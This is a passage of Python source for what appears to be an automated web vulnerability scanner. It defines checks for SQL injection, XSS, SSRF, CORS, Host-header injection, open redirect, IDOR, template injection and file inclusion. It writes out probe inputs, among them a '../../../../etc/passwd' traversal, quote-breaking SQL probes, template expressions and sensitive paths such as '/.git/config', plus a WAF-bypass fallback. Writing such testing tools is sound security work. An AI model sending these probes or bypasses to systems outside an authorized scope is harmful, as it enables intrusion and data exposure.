"""
scanner.checks — the active-check library.

A check is the unit Burp's scanner is built from: for a bug class, it knows how
to *probe* one insertion point (what payloads to place, how many requests to
send) and how to shape the observed responses into a :class:`verify.FindingContext`
that the deterministic oracle layer adjudicates. The oracle — never the LLM,
never a heuristic — decides confirmation, so every finding this library produces
is signal-anchored (the precision property Burp's Tentative/Firm heuristics
lack).

Checks are pure w.r.t. the graph and deterministic given a `send`: the marker a
reflection check plants is derived from the insertion point's id, so a run is
replayable. A check emits a FindingContext or None (insufficient evidence); it
makes NO confirmation decision itself.

Boundary: checks place payloads only into the insertion point the engine hands
them, and only issue requests through the engine's injected `send` — which in
production is the scope/charter/kill-switch/egress-gated executor. Payloads here
are verification probes (differential terms, unique canary markers, traversal
tokens), not weaponized exploits.
"""

from __future__ import annotations

import math
import re
import time
from dataclasses import dataclass
from typing import Callable, ClassVar, Protocol, runtime_checkable
from urllib.parse import urljoin, urlsplit

from ..verify.adapter import FindingContext
from ..verify.oob import OOBReceiver
from .insertion import HttpRequest, InsertionPoint, RequestTemplate

# A `send` turns a rendered request into an observed response dict
# {status, body, latency_ms?}. Injected by the engine so checks never touch the
# network directly (and tests drive a localhost target).
Send = Callable[[HttpRequest], dict]


@runtime_checkable
class Check(Protocol):
    """Probes one insertion point and returns oracle-ready evidence, or None."""

    id: str
    bug_class: str

    def probe(
        self, template: RequestTemplate, point: InsertionPoint, send: Send
    ) -> FindingContext | None: ...


@dataclass(frozen=True)
class DifferentialCheck:
    """Boolean/logic differential: send a benign value and a probe value into the
    same point and let the differential oracle judge whether the responses
    diverge (boolean-blind SQLi/NoSQLi, auth-logic, filter bypass).

    The point's own base value is NOT used as the baseline — a fresh benign value
    is, so the comparison is payload-vs-payload and the base is left untouched as
    a control the engine can re-check."""

    id: str
    bug_class: str
    benign: str
    probe_payload: str

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        baseline = send(template.render(point, self.benign))
        mutated = send(template.render(point, self.probe_payload))
        return FindingContext.from_http_responses(
            baseline, mutated, bug_class=self.bug_class,
            discriminator={"dimensions": ["status", "length", "lexical"]},
        )


@dataclass(frozen=True)
class BooleanInferenceCheck:
    """Boolean-blind via a sequential probability ratio test (SPRT).

    Each round sends a TRUE-condition clause and the FALSE-condition clause
    twice (the second FALSE is a dynamic-page control). It runs the SPRT online
    to stop as soon as the evidence is decisive — few rounds for a clear signal,
    a bounded ``n_max`` otherwise — then hands every collected round to the
    boolean-inference oracle, which recomputes the same decision deterministically.
    Robust to flaky/dynamic backends that make a single true/false comparison
    false-positive."""

    id: str
    bug_class: str
    true_clause: str
    false_clause: str
    n_max: int = 24
    alpha: float = 0.05
    beta: float = 0.05
    p1: float = 0.9
    p0: float = 0.1

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        from ..verify.oracles import differential_response_oracle  # local: avoid import cycle at module load

        upper = math.log((1.0 - self.beta) / self.alpha)
        lower = math.log(self.beta / (1.0 - self.alpha))
        llr = 0.0
        trues: list[dict] = []
        false_as: list[dict] = []
        false_bs: list[dict] = []
        for _ in range(self.n_max):
            t = _as_dict(send(template.render(point, self.true_clause)))
            a = _as_dict(send(template.render(point, self.false_clause)))
            b = _as_dict(send(template.render(point, self.false_clause)))
            trues.append(t)
            false_as.append(a)
            false_bs.append(b)
            across = differential_response_oracle(a, t).fired
            within_same = not differential_response_oracle(a, b).fired
            signal = across and within_same
            llr += math.log(self.p1 / self.p0) if signal else math.log((1.0 - self.p1) / (1.0 - self.p0))
            if llr >= upper or llr <= lower:
                break  # SPRT reached a decision — stop early

        return FindingContext.from_boolean_probes(
            trues, false_as, false_bs, bug_class=self.bug_class,
        )


def _as_dict(resp: object) -> dict:
    if isinstance(resp, dict):
        return resp
    return {"body": str(resp)}


@dataclass(frozen=True)
class TimingCheck:
    """Statistical time-based blind (SQLi / command injection).

    Measures ``samples`` paired latencies — a benign value vs a delay-injecting
    payload — and hands them to the timing oracle, which decides via a rank-sum
    test + effect-size floor + optional dose-response (never a fixed threshold).
    Benign and probe requests are interleaved so latency drift biases both
    equally. Expensive (``2*samples`` requests per point), so it is opt-in and
    best spent on bandit-prioritised candidates."""

    id: str
    bug_class: str
    benign: str
    sleep_payload: str
    injected_ms: float
    samples: int = 15
    # optional second, larger delay for a dose-response corroboration
    dose_payload: str | None = None
    dose_ms: float | None = None

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        base: list[float] = []
        treat: list[float] = []
        dose_samples: list[float] = []
        for _ in range(self.samples):
            base.append(self._time(send, template, point, self.benign))
            treat.append(self._time(send, template, point, self.sleep_payload))
            if self.dose_payload is not None:
                dose_samples.append(self._time(send, template, point, self.dose_payload))

        dose = None
        if self.dose_payload is not None and self.dose_ms:
            dose = {
                "low_ms": self.injected_ms, "low_samples": treat,
                "high_ms": self.dose_ms, "high_samples": dose_samples,
            }
        return FindingContext.from_timing_samples(
            base, treat, bug_class=self.bug_class,
            injected_ms=self.injected_ms, dose=dose,
        )

    @staticmethod
    def _time(send: Send, template: RequestTemplate, point: InsertionPoint, value: str) -> float:
        """Wall-time one request in milliseconds. Times the ``send`` itself (the
        I/O), so it works whether or not the send reports its own latency; a
        blind payload that makes the target error is still timed."""
        t0 = time.monotonic()
        try:
            send(template.render(point, value))
        except Exception:
            pass
        return (time.monotonic() - t0) * 1000.0


@dataclass(frozen=True)
class MarkerReflectionCheck:
    """Side-effect reflection: place a unique canary (wrapped by `payload_template`)
    and confirm via the side-effect oracle iff the *raw* canary reaches the
    response sink (reflected/stored XSS, error-based/echoed injection,
    template/EL reflection, path-traversal content markers).

    The canary is derived from the point id so it is unique per position and the
    run is deterministic. `payload_template` must contain `{marker}`."""

    id: str
    bug_class: str
    payload_template: str = "{marker}"

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        marker = f"crucible{_slugify(point.id)}mark"
        payload = self.payload_template.format(marker=marker)
        resp = send(template.render(point, payload))
        body = resp.get("body", "") if isinstance(resp, dict) else str(resp)
        return FindingContext.from_side_effect(marker, body, bug_class=self.bug_class)

    def adapt(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        """WAF-adaptive fallback (opt-in, engine-driven): when the canonical payload
        is filtered/blocked, synthesize a form that both gets past the filter AND
        reflects the canary into an EXECUTABLE context, then hand that response to the
        same side-effect oracle. The sink proxy is the executable-reflection oracle
        itself, so a bypass that only reflects inertly is not treated as success — the
        precision anchor is unchanged."""
        from .fitness import reflection_proximity
        from .waf_evasion import adaptive_bypass
        from ..verify.oracles import reflection_context_oracle

        marker = f"crucible{_slugify(point.id)}mark"
        payload = self.payload_template.format(marker=marker)

        def send_form(form: str) -> dict:
            return send(template.render(point, form))

        def sink_present(resp: dict) -> bool:
            body = resp.get("body", "") if isinstance(resp, dict) else str(resp)
            return reflection_context_oracle(marker, body).fired

        def proximity(resp: dict) -> float:
            body = resp.get("body", "") if isinstance(resp, dict) else str(resp)
            return reflection_proximity(marker, body)

        res = adaptive_bypass(payload, send_form, sink_present, proximity=proximity)
        if res is None:
            return None
        body = res.response.get("body", "") if isinstance(res.response, dict) else str(res.response)
        return FindingContext.from_side_effect(marker, body, bug_class=self.bug_class)


@dataclass(frozen=True)
class OOBCheck:
    """Out-of-band (blind) check: mint a unique correlation token, embed its
    loopback callback URL into a payload, inject it, and poll the receiver for
    an inbound interaction. The proof is the *callback the target makes*, not
    anything in the response — so this reaches the blind classes (SSRF, blind
    XXE, OOB SQLi, deserialization/JNDI gadgets) that leave no visible signal.

    ``payload_template`` must contain ``{callback}``. Polling is deadline-bounded
    with a small interval so a DEFERRED interaction (a callback that lands after
    the injecting request returns) is still caught — the case a single one-shot
    poll misses. Distinguished from response-based checks by ``wants_oob``; the
    engine hands it the receiver."""

    id: str
    bug_class: str
    payload_template: str = "{callback}"
    poll_deadline: float = 2.0
    poll_interval: float = 0.05

    wants_oob: ClassVar[bool] = True

    def probe(
        self, template: RequestTemplate, point: InsertionPoint, send: Send, oob: OOBReceiver
    ) -> FindingContext | None:
        token, callback_url = oob.register_token()
        payload = self.payload_template.format(callback=callback_url)
        try:
            send(template.render(point, payload))
        except Exception:
            # A blind payload may make the target error its own response; the
            # callback — not the response — is the signal, so keep waiting for it.
            pass
        deadline = time.monotonic() + self.poll_deadline
        hits = oob.poll(token)
        while not hits and time.monotonic() < deadline:
            time.sleep(self.poll_interval)
            hits = oob.poll(token)
        # VF-2a: retain the REGISTERED per-finding token so the oracle fires only for a callback that carried
        # it (live AND on offline re-verify) — a fabricated/unrelated hit no longer confirms.
        return FindingContext.from_oob(hits, bug_class=self.bug_class, expected_token=token)


@runtime_checkable
class RequestCheck(Protocol):
    """A check that operates on the WHOLE request/response — adding a header,
    reading a response header — rather than fuzzing one insertion point. The
    engine runs it once per request. Returns oracle-ready evidence, or None."""

    id: str
    bug_class: str

    def probe(self, template: RequestTemplate, send: Send) -> FindingContext | None: ...


@dataclass(frozen=True)
class CorsActiveCheck:
    """Active CORS misconfiguration: send a hostile ``Origin`` and check whether
    the server REFLECTS it back with credentials — the exact combination that lets
    an attacker page read authenticated responses. Confirmed via achieved-state
    only on the dangerous reflection, so a properly-scoped CORS policy does not
    fire. Note: ``Access-Control-Allow-Origin: *`` WITH credentials is deliberately
    NOT confirmed here — browsers refuse ``*``+credentials, so it is not
    credential-readable and would be an over-claim as an exploitable FACT (a passive
    check may still surface it as a lower-severity misconfiguration lead)."""

    id: str = "cors-active"
    bug_class: str = "cors"
    evil_origin: str = "https://crucible-evil-origin.test"

    def probe(self, template: RequestTemplate, send: Send) -> FindingContext | None:
        req = template.request
        headers = [(k, v) for k, v in req.headers if k.lower() != "origin"]
        headers.append(("Origin", self.evil_origin))
        resp = send(req.model_copy(update={"headers": headers}))
        if not isinstance(resp, dict):
            return None
        rh = resp.get("headers", []) or []
        acao = next((str(v) for k, v in rh if str(k).lower() == "access-control-allow-origin"), "")
        acac = next((str(v) for k, v in rh if str(k).lower() == "access-control-allow-credentials"), "")
        # The ORACLE decides the exploitable condition over the raw header values:
        # ACAO REFLECTS the hostile origin AND credentials are allowed. A wildcard
        # (`*`) is excluded — browsers do not honour `*`+credentials, so it cannot
        # read authenticated responses. A properly-scoped policy fails the predicate.
        return FindingContext.from_predicate(
            {"acao": acao, "acac": acac, "evil_origin": self.evil_origin},
            {"all": [
                {"eq": [{"var": "acao"}, {"var": "evil_origin"}]},
                {"ieq": [{"var": "acac"}, "true"]},
            ]},
            bug_class=self.bug_class)


@dataclass(frozen=True)
class HostHeaderCheck:
    """Host-header injection: send a hostile ``Host`` and check whether the app
    reflects it into an absolute URL — a redirect ``Location`` or an absolute link
    in the body — which is what poisons password-reset links and web-cache. A
    plain-text echo of the host does not fire; only its use as a URL authority."""

    id: str = "host-header"
    bug_class: str = "host_header_injection"
    evil_host: str = "crucible-evil-host.test"

    def probe(self, template: RequestTemplate, send: Send) -> FindingContext | None:
        req = template.request
        headers = [(k, v) for k, v in req.headers if k.lower() != "host"]
        headers.append(("Host", self.evil_host))
        resp = send(req.model_copy(update={"headers": headers}))
        if not isinstance(resp, dict):
            return None
        body = str(resp.get("body", ""))
        rh = resp.get("headers", []) or []
        location = next((str(v) for k, v in rh if str(k).lower() == "location"), "")
        # The oracle checks whether the hostile Host became the AUTHORITY of a URL the
        # app EMITS (a redirect Location, an href/src/action link/resource/form, or a
        # meta/JS redirect) — the only forms a victim's browser would actually use. A
        # plain-text ECHO of the reconstructed URL back to the requester does NOT fire
        # (not exploitable), and matching is on the WHOLE authority, so a subdomain
        # reflection like `//evil-host.cdn.example.com` does not collide with the evil
        # host either.
        return FindingContext.from_predicate(
            {"location_host": _host(location), "evil_host": self.evil_host,
             "body": body, "emitted_url_hosts": _emitted_url_hosts(body)},
            {"any": [
                {"eq": [{"var": "location_host"}, {"var": "evil_host"}]},
                {"in": [{"var": "evil_host"}, {"var": "emitted_url_hosts"}]},
            ]},
            bug_class=self.bug_class)


@dataclass(frozen=True)
class OpenRedirectCheck:
    """Open redirection: inject a canary absolute URL into a redirect parameter
    and confirm via achieved-state ONLY when the response actually redirects to
    the canary's host — a 30x Location to the canary host, or a meta-refresh /
    JS-location redirect that resolves to it. A redirect that stays on the app's
    own host (the app merely echoing the param inside its own URL) does NOT fire,
    so this does not false-positive on reflected-but-safe redirect params.

    Runs on any point (the caller scopes it via targeting to redirect-ish params).
    Needs response headers from ``send``; a follow-redirects=False client (the
    production executor) exposes the Location header."""

    id: str = "open-redirect"
    bug_class: str = "open_redirect"
    canary: str = "https://crucible-redirect-canary.test/pwned"

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        resp = send(template.render(point, self.canary))
        if not isinstance(resp, dict):
            return None
        status = int(resp.get("status", 0))
        headers = resp.get("headers", []) or []
        location = next((str(v) for k, v in headers if str(k).lower() == "location"), "")
        body = str(resp.get("body", ""))

        # The oracle decides redirection to the canary host over the raw status,
        # Location, and the body's ACTUAL navigation targets: a 30x Location to the
        # canary host, OR a meta-refresh / JS-location sink whose target host IS the
        # canary host. Reflection on the app's own host — or the canary merely echoed
        # somewhere in the body next to an unrelated <meta http-equiv=...> — fails the
        # predicate (no false positive on echoed-but-safe params).
        return FindingContext.from_predicate(
            {"status": status, "location_host": _host(location),
             "canary_host": _host(self.canary), "body": body,
             "markup_redirect_hosts": _markup_redirect_hosts(body)},
            {"any": [
                {"all": [
                    {"in": [{"var": "status"}, [301, 302, 303, 307, 308]]},
                    {"eq": [{"var": "location_host"}, {"var": "canary_host"}]},
                ]},
                {"all": [
                    {"min_len": [{"var": "canary_host"}, 1]},
                    {"in": [{"var": "canary_host"}, {"var": "markup_redirect_hosts"}]},
                ]},
            ]},
            bug_class=self.bug_class)


@dataclass(frozen=True)
class IdorCheck:
    """Broken-object-level authorization (IDOR / BOLA) via a two-identity read.

    Confirmation is achieved-state, not reflection: acting as the attacker, it
    requests an object owned by a DIFFERENT identity (``victim_ref``) and checks
    whether the response actually reveals that identity's object content — the
    ground truth being what the victim's own session (``victim_send``) sees for
    the same reference. Cross-tenant read (attacker got 200 AND the victim's
    distinctive content appears in the attacker's response) fires the
    achieved-state oracle; a 403/empty/different response does not. This is the
    honest BOLA test: an oracle-confirmed unauthorized read, never a guess from
    a numeric parameter's mere presence.

    Runs only on the object-reference point (``ref_param``); other points return
    None. ``victim_send`` is a send authenticated as the victim — supply it from
    the session layer (a second AuthSession)."""

    id: str
    ref_param: str
    victim_ref: str
    victim_send: Send
    bug_class: str = "idor"

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        if point.name != self.ref_param:
            return None
        victim = self.victim_send(template.render(point, self.victim_ref))
        attacker = send(template.render(point, self.victim_ref))
        victim_body = (str(victim.get("body", "")) if isinstance(victim, dict) else str(victim)).strip()
        attacker_body = str(attacker.get("body", "")) if isinstance(attacker, dict) else str(attacker)
        attacker_status = int(attacker.get("status", 0)) if isinstance(attacker, dict) else 0

        # The oracle decides the cross-tenant read over the raw bodies/status:
        # the attacker got 200, the victim actually has object content, and that
        # exact content appears in the attacker's response.
        return FindingContext.from_predicate(
            {"attacker_status": attacker_status, "victim_body": victim_body,
             "attacker_body": attacker_body},
            {"all": [
                {"eq": [{"var": "attacker_status"}, 200]},
                {"min_len": [{"var": "victim_body"}, 8]},
                {"contains": [{"var": "attacker_body"}, {"var": "victim_body"}]},
            ]},
            bug_class=self.bug_class,
        )


@dataclass(frozen=True)
class EvaluationCheck:
    """Server-side template / expression-language injection via EVALUATION.

    Sends a benign control and an arithmetic probe expression (e.g. Jinja2
    ``{{31337*31337}}``), captures both responses, and hands them to the
    evaluation oracle — which confirms SSTI/EL only when the server COMPUTED the
    expression (the result present, the raw template text absent), never on mere
    reflection. ``probe_expr`` and ``expected_result`` are paired per template
    engine; use a distinctive product so the result cannot coincidentally appear."""

    id: str
    bug_class: str
    probe_expr: str
    expected_result: str
    benign: str = "crucible-benign-eval"

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        control = send(template.render(point, self.benign))
        probe = send(template.render(point, self.probe_expr))
        control_body = control.get("body", "") if isinstance(control, dict) else str(control)
        probe_body = probe.get("body", "") if isinstance(probe, dict) else str(probe)
        return FindingContext.from_evaluation(
            self.probe_expr, self.expected_result, probe_body,
            control_body=control_body, bug_class=self.bug_class,
        )


@dataclass(frozen=True)
class ErrorSignatureCheck:
    """Error-based injection (SQL/NoSQL/LDAP/XPath) via a provoked backend error.

    Sends a benign control and a syntax-breaking payload (e.g. a lone quote), and
    hands both responses to the error-signature oracle — which confirms only when
    a distinctive datastore/parser error appears in the probe response but NOT in
    the benign control, so a page that always shows a stack trace cannot be
    mistaken for injection."""

    id: str
    bug_class: str
    probe_payload: str = "'\"`)"
    benign: str = "crucible-benign-term"

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        control = send(template.render(point, self.benign))
        probe = send(template.render(point, self.probe_payload))
        control_body = control.get("body", "") if isinstance(control, dict) else str(control)
        probe_body = probe.get("body", "") if isinstance(probe, dict) else str(probe)
        return FindingContext.from_error_signature(
            probe_body, control_body=control_body, bug_class=self.bug_class,
        )


@dataclass(frozen=True)
class ContentSignatureCheck:
    """File read / local file inclusion by KNOWN-CONTENT signature.

    Injects a payload (e.g. a traversal ``../../../../etc/passwd``) into the
    insertion point and confirms via the side-effect oracle ONLY when a
    distinctive signature of the *target file's content* (``root:x:0:0:``, a
    ``[extensions]`` INI section, ``<web-app``) appears in the response — proof the
    file was actually READ, not merely that the path was reflected. The signature
    is specific enough that its presence is the proof; a reflected-but-not-read
    payload does not fire (the current marker-reflection path-traversal check only
    proved reflection, which is not a file read)."""

    id: str
    bug_class: str
    payload: str
    signature: str

    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        resp = send(template.render(point, self.payload))
        body = resp.get("body", "") if isinstance(resp, dict) else str(resp)
        return FindingContext.from_side_effect(self.signature, body, bug_class=self.bug_class)

    def adapt(self, template: RequestTemplate, point: InsertionPoint, send: Send) -> FindingContext | None:
        """WAF-adaptive fallback (opt-in): when a traversal payload is filtered,
        synthesize a form that gets past the filter AND still returns the target
        file's content signature. The sink proxy is the signature's presence — proof
        the file was read, not merely that the path reflected — so the confirmation
        bar is identical to the normal path."""
        from .waf_evasion import adaptive_bypass

        def send_form(form: str) -> dict:
            return send(template.render(point, form))

        def sink_present(resp: dict) -> bool:
            body = resp.get("body", "") if isinstance(resp, dict) else str(resp)
            return self.signature in body

        res = adaptive_bypass(self.payload, send_form, sink_present)
        if res is None:
            return None
        body = res.response.get("body", "") if isinstance(res.response, dict) else str(res.response)
        return FindingContext.from_side_effect(self.signature, body, bug_class=self.bug_class)


@dataclass(frozen=True)
class PathProbeCheck:
    """Framework/CMS exposure via a known-path signature (a request-level check).

    Fetches a fixed path relative to the target (e.g. ``/actuator/env``,
    ``/wp-json``, ``/.git/config``) and confirms exposure ONLY when a distinctive
    signature the framework leaks (``propertySources``, ``DB_PASSWORD``, a WP REST
    JSON) appears in the response — adjudicated by the predicate oracle, not a mere
    2xx. The signature must be specific enough that its presence is proof; a 404 or
    a signature-less response does not fire. Runs once per host."""

    id: str
    bug_class: str
    probe_path: str
    signature: str
    http_method: str = "GET"

    def probe(self, template: RequestTemplate, send: Send) -> FindingContext | None:
        req = template.request
        parts = urlsplit(req.url)
        base = f"{parts.scheme}://{parts.netloc}/"
        url = urljoin(base, self.probe_path.lstrip("/"))
        resp = send(req.model_copy(update={"method": self.http_method, "url": url, "body": ""}))
        if not isinstance(resp, dict):
            return None
        status = int(resp.get("status", 0))
        body = str(resp.get("body", ""))
        if status in (0, 404):
            return None  # not present -> nothing to adjudicate
        return FindingContext.from_predicate(
            {"status": status, "body": body},
            {"all": [{"icontains": [{"var": "body"}, self.signature]}]},
            bug_class=self.bug_class,
        )


def _slugify(s: str) -> str:
    return "".join(c for c in s if c.isalnum())


def _host(url: str) -> str:
    """The netloc of a URL, lowercased, or '' if it has none (relative URL)."""
    return urlsplit(url).netloc.lower()


# Scan windows are BOUNDED so a hostile, unterminated body cannot cause quadratic backtracking: a real
# <meta> tag or redirect URL never approaches these limits, but an attacker-controlled response could
# otherwise pack many "<meta " starts with no ">" (each greedy [^>]* rescanning to end → O(n^2)).
_MARKUP_SCAN_CAP = 512_000        # only the head of a response carries navigation markup; cap the parse
# Each pattern is anchored to a real ATTRIBUTE/IDENTIFIER boundary with `(?<![-\w])`: a plain `\b` is NOT
# sufficient, because `-` is a non-word character, so `\bcontent` still matches inside `data-content=`
# (that gap let a benign own-host redirect mint a false FACT — re-red-pen BLOCK-C). The lookbehind excludes
# `-` and word chars but deliberately ALLOWS `.`, so real sinks like `top.location.href` still match.
# `<` is excluded from the tag body as well as `>`: a real tag never contains a raw `<`, and excluding it
# makes a hostile run of unterminated `<meta<meta<meta…` fail after ONE character instead of re-scanning the
# 4096-char bound at every start position (the last super-linear hot spot on the mint path).
_META_TAG = re.compile(r"<meta\b[^<>]{0,4096}>", re.IGNORECASE)
_HTTP_EQUIV_REFRESH = re.compile(r"(?<![-\w])http-equiv\s*=\s*[\"']?\s*refresh", re.IGNORECASE)
# The value is delimited by the SAME quote it opened with, so an inner quote of the other kind is part of
# the value: `content="0; url='https://x/'"` is a real redirect browsers honour (WHATWG strips the inner
# quotes), and a single `["']` class would have truncated it to `0; url=` and MISSED it.
_META_CONTENT = re.compile(r"(?<![-\w])content\s*=\s*(?:\"([^\"]{0,4096})\"|'([^']{0,4096})')", re.IGNORECASE)


def _meta_content_value(tag: str) -> str | None:
    """The ``content`` attribute value of a meta tag (either quote style), or None."""
    m = _META_CONTENT.search(tag)
    if m is None:
        return None
    return m.group(1) if m.group(1) is not None else m.group(2)
_META_CONTENT_URL = re.compile(r"(?<![-\w])url\s*=\s*(.{0,4096}?)\s*$", re.IGNORECASE)
# JS navigation sinks: location.href/.assign/.replace, window/document.location[.href], with = or (
_JS_REDIRECT = re.compile(
    r"(?<![-\w])(?:(?:window|document)\.)?location(?:\.href|\.assign|\.replace)?\s*(?:=|\()\s*"
    r"[\"']([^\"']{1,4096})[\"']",
    re.IGNORECASE)


# A URL the app EMITS as a navigable link / loadable resource / form target — the only place a reflected
# Host becomes attacker-controllable for a VICTIM (cache-poisoned resource, reset-link, form post). An href/
# src/action attribute value is bounded (a URL never approaches 4096). `(?<![-\w])` anchors the attribute
# name so `data-href`/`x-src` do not match (the same attribute-boundary lesson as _META_CONTENT).
# `<`/`>` excluded from the value for the same fail-fast reason as _META_TAG (a URL attribute value in HTML
# never contains a raw angle bracket).
_URL_ATTR = re.compile(r"(?<![-\w])(?:href|src|action)\s*=\s*[\"']([^\"'<>]{1,4096})[\"']", re.IGNORECASE)
# URL-valued canonical / social metadata: og:url is THE canonical link that crawlers, link-preview and cache
# layers consume as authoritative — poisoning it via the Host header is a real cache/canonical-hijack sink
# (and is the benchmark's host-header primitive). This is a STRUCTURED metadata emission, distinct from an
# inert free-text echo of a reconstructed URL, so counting it does not reopen BLOCK-D.
_META_PROPERTY = re.compile(r"(?<![-\w])(?:property|name)\s*=\s*[\"']([^\"']{0,256})[\"']", re.IGNORECASE)
# The property name must match the WHOLE value against an allow-list of genuinely URL-valued properties
# (`fullmatch`). A substring test would fire on `not-og:url`, on a value that merely CONTAINS `og:url`, and
# — worst — on `twitter:image:alt` / `og:image:alt`, which are ALT TEXT, not URLs. Text sub-properties are
# excluded by construction; only the `:url` / `:secure_url` / `:src` sub-properties are URL-valued.
_URL_VALUED_META = re.compile(
    r"og:(?:url|(?:image|audio|video)(?::(?:url|secure_url))?)|twitter:(?:url|image(?::src)?)",
    re.IGNORECASE)


def _emitted_url_hosts(body: str) -> list[str]:
    """The hosts that appear as the AUTHORITY of a URL the app EMITS — an href/src/action attribute value,
    or a meta-refresh / JS-location redirect target — lowercased. These are URLs a VICTIM's browser would
    actually use, which is what makes a reflected ``Host`` exploitable (cache poisoning, poisoned reset link).

    Crucially this is EMISSION, not mere presence: a ``//authority`` that only appears as inert body text — a
    404 message echoing the reconstructed ``http://<Host>/path`` back to the requester, a ``<pre>`` sample, an
    HTML comment, a JSON error string — is NOT counted. Such an echo is shown only to the requester (who set
    their own Host) and is not exploitable; counting it minted a signed false FACT (re-red-pen BLOCK-D). The
    authority is parsed with stdlib ``urlsplit`` (via ``_host``), so a relative URL whose QUERY contains
    ``//evil`` (``/x?u=//evil``) is correctly NOT an emission of ``evil``. Bounded like the markup scan."""
    raw = (body or "")[:_MARKUP_SCAN_CAP]
    hosts = list(_markup_redirect_hosts(raw))           # meta-refresh + JS location sinks (redirect emission)
    # Attribute/metadata emission is read from markup a browser actually PARSES: comments and raw-text
    # elements (script/style/textarea) are dropped, so an href/<meta> merely echoed into one is not counted.
    body = _mask_inert(raw, _INERT_EMISSION)
    for val in _URL_ATTR.findall(body):                 # href/src/action link/resource/form emission
        h = _host(val.strip())                          # urlsplit authority: '' for relative/same-origin URLs
        if h:
            hosts.append(h)
    for tag in _META_TAG.findall(body):                 # canonical / social URL metadata (og:url, ...)
        prop = _META_PROPERTY.search(tag)
        if prop and _URL_VALUED_META.fullmatch(prop.group(1).strip()):
            content = _meta_content_value(tag)
            if content is not None:
                h = _host(content.strip())
                if h:
                    hosts.append(h)
    return hosts


# Inert regions: markup inside an HTML comment is never parsed, and raw-text / escapable-text elements have
# contents a browser renders LITERALLY rather than parsing as markup. A `href=` / `<meta>` echoed into one of
# them is NOT an emission and does not navigate — counting it minted false FACTs. `<pre>`/`<code>` are
# deliberately NOT inert: tags inside them ARE live (a <pre><a href> is a real, clickable link).
#
# `<plaintext>` has no end tag (everything after it is literal), and an unterminated inert element likewise
# swallows the rest of the document — both are handled by masking to EOF.
_INERT_EMISSION = ("script", "style", "textarea", "title", "xmp", "plaintext",
                   "noscript", "noembed", "noframes", "template", "iframe")
# For REDIRECT sinks, `<script>` content is deliberately NOT masked: JS location sinks legitimately live
# there. Everything else that renders literally still cannot navigate.
_INERT_REDIRECT = tuple(e for e in _INERT_EMISSION if e != "script")


def _mask_inert(body: str, elements: tuple[str, ...]) -> str:
    """Blank out HTML comments and the CONTENT of inert ``elements``, in ONE LINEAR pass (``str.find`` only).

    Deliberately implemented without a regex: a lazy ``.*?`` over attacker-controlled bytes backtracks
    quadratically (a body of unterminated ``<!--`` / ``<script>`` stalled the mint path for minutes). Each
    character is visited a bounded number of times here, so runtime is linear in the (already capped) body.

    An element's OPENING TAG is preserved — only its inner text is blanked — so URL attributes on the tag
    itself (``<script src="https://host/x.js">``, ``<iframe src=...>``) remain visible to the emission scan;
    blanking the whole element dropped that genuine, high-severity sink."""
    body = body or ""
    low = body.lower()
    out = list(body)
    n = len(body)
    i = 0
    while i < n:
        j = low.find("<", i)
        if j < 0:
            break
        if low.startswith("<!--", j):                       # comment: blank the whole thing (incl. markers)
            end = low.find("-->", j + 4)
            stop = n if end < 0 else end + 3                # unterminated comment runs to EOF
            out[j:stop] = " " * (stop - j)
            i = stop
            continue
        el = next((e for e in elements if low.startswith("<" + e, j)
                   and (j + 1 + len(e) >= n or not (low[j + 1 + len(e)].isalnum()
                                                    or low[j + 1 + len(e)] in "-_"))), None)
        if el is None:
            i = j + 1
            continue
        gt = low.find(">", j)
        if gt < 0:                                          # unterminated opening tag: nothing after parses
            break
        close = low.find("</" + el, gt + 1)
        stop = n if close < 0 else close                    # no end tag (or <plaintext>): literal to EOF
        out[gt + 1:stop] = " " * (stop - gt - 1)            # keep the opening tag, blank the content
        i = stop
    return "".join(out)


def _strip_html_comments(body: str) -> str:
    """Drop HTML comments only — commented-out markup is never parsed, so it emits and navigates nothing."""
    return _mask_inert(body, ())


def _markup_redirect_hosts(body: str) -> list[str]:
    """The hosts a browser would actually NAVIGATE to from the response markup — the target of a
    meta-refresh (``<meta http-equiv=refresh content='...;url=<URL>'>``) or a JS location sink
    (``location.href/.assign/.replace``, ``window/document.location``). Returns lowercased netlocs; a
    relative / same-origin target contributes nothing (dropped). This is the co-location test that makes
    open-redirect confirmation sound: the canary host must be an ACTUAL navigation target, not merely a
    substring reflected somewhere in the body next to an unrelated ``<meta http-equiv=Content-Type>``.

    The body is length-capped and the tag/URL scans are bounded so a hostile response body cannot make
    this parse super-linear (availability, per the re-red-pen).

    HONEST RESIDUAL: the extracted host list is a DERIVED observation stored in ``observed_evidence``
    alongside the raw ``body``, so re-verification re-fires the predicate over the derived list rather than
    re-parsing the body. The certificate signature makes the stored evidence tamper-evident, but the
    veracity firewall cannot demote a MINT-TIME derivation bug in this parser — which is why the parser is
    pinned by explicit true-positive AND negative-control tests. This is the same property every shipped
    predicate has (e.g. ``location_host = _host(location)``), not one specific to this helper."""
    # HTML comments are stripped — commented-out markup never navigates. ``<script>`` is deliberately NOT
    # stripped here: JS location sinks legitimately live inside it.
    body = _mask_inert((body or "")[:_MARKUP_SCAN_CAP], _INERT_REDIRECT)
    hosts: list[str] = []
    for tag in _META_TAG.findall(body):
        if _HTTP_EQUIV_REFRESH.search(tag):
            m = _meta_content_value(tag)
            if m is not None:
                u = _META_CONTENT_URL.search(m)
                if u:
                    hosts.append(_host(u.group(1).strip().strip("'\"")))
    for u in _JS_REDIRECT.findall(body):
        hosts.append(_host(u.strip()))
    return [h for h in hosts if h]   # only real authorities — a relative target is not an open redirect


# ---------------------------------------------------------------------------
# A seed library covering oracle-observable classes the verify layer confirms.
# Each check reuses an EXISTING oracle (differential / side_effect), so adding a
# class is a payload+shape declaration, not new confirmation machinery.
# ---------------------------------------------------------------------------

BOOLEAN_SQLI = DifferentialCheck(
    id="boolean-sqli", bug_class="boolean_sqli",
